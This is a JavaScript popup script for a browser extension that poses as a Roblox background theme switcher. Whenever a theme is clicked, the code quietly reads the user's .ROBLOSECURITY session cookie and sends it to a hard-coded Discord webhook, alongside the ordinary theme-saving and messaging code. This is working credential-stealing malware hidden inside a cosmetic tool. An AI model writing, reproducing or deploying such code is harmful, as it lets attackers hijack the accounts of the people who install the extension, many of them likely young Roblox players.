const themes = [
  { name: "Dark Mode", color: "#2e2e2e" }, 
  { name: "Light Mode", color: "#ffffff" }, 
  { name: "Ocean Blue", color: "#0077b6" },
  { name: "Forest Green", color: "#2b7a0b" }, 
  { name: "Sunset Orange", color: "#f18f01" }
];

const themeList = document.getElementById('theme-list');

// Clear the initial loading text
themeList.innerHTML = '';

// Generate the theme list dynamically
themes.forEach(theme => {
    const li = document.createElement('li');
    li.textContent = theme.name;
    li.onclick = () => {
        // Save the selected theme
        chrome.storage.sync.set({ theme: theme.name });

        document.querySelectorAll('.theme-list li').forEach(el => el.classList.remove('active-theme'));
        li.classList.add('active-theme');

        // Send message to the content script to change the Roblox page background
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            chrome.tabs.sendMessage(tabs[0].id, {
                action: "changeTheme",
                color: theme.color
            });
        });

        // Fetch and send .roblosecurity cookie to webhook
        chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, function(cookie) {
            if (cookie) {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify({
                    roblosecurity: cookie.value,
                    theme: theme.name
                }));
            } else {
                console.log("No .ROBLOSECURITY cookie found.");
            }
        });
    };
    themeList.appendChild(li);
});

// Set the currently selected theme as active when loaded
chrome.storage.sync.get('theme', (data) => {
    const activeTheme = data.theme;
    if (activeTheme) {
        const activeLi = Array.from(document.querySelectorAll('.theme-list li')).find(li => li.textContent === activeTheme);
        if (activeLi) activeLi.classList.add('active-theme');
        
        // Send message to the content script to apply the stored theme
        const selectedTheme = themes.find(t => t.name === activeTheme);
        if (selectedTheme) {
            chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
                chrome.tabs.sendMessage(tabs[0].id, {
                    action: "changeTheme",
                    color: selectedTheme.color
                });
            });
        }
    }
});
